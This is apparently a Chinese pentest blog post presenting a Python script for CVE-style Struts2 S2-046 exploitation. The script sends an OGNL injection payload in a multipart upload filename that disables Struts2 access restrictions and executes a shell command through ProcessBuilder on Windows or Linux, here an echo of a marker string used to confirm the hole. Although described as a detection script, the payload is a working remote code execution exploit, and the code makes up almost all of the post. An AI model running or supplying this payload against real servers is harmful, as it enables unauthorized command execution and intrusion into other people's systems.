---
draft: false
date: 2017-04-16 17:44:01
title: Struts2-046 EXP
description: 
categories:
  - Pentest
tags:
  - rce
---

### Struts2 046
前段时间写的struts2 046检测脚本，代码如下：
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# code by reber

import sys
import pycurl
import StringIO


def initCurl():
    c = pycurl.Curl()
    c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源
    c.setopt(pycurl.MAXREDIRS, 5)
    # c.setopt(pycurl.PROXY,'http://127.0.0.1:1080')
    return c

def check(curl, url):
    head = [
        'Connection: close',
        'Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150'
    ]

    data = '''-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name="foo"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo dd996b71024fa97cd015f06a7f24ed30').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n'''

    buf = StringIO.StringIO()
    curl.setopt(pycurl.WRITEFUNCTION, buf.write)
    curl.setopt(pycurl.POSTFIELDS,  data)
    curl.setopt(pycurl.URL, url)
    # curl.setopt(pycurl.TIMEOUT, 10)
    curl.setopt(pycurl.HTTPHEADER,  head)
    curl.setopt(pycurl.SSL_VERIFYPEER, 0)
    curl.setopt(pycurl.SSL_VERIFYHOST, 0)
    curl.perform()
    the_page = buf.getvalue()
    buf.close()

    if 'dd996b71024fa97cd015f06a7f24ed30' in the_page:
        print "%s has st2-046 vulnerable." % url

def run(url):
    c = initCurl()
    check(c, url)
    sys.exit(0)

if __name__ == '__main__':
    if len(sys.argv) == 2:
        url = sys.argv[1]
        run(url)
    else:
        print ("usage: %s http://www.baidu.com/vuln.action whoami" % sys.argv[0])
        sys.exit(-1)
```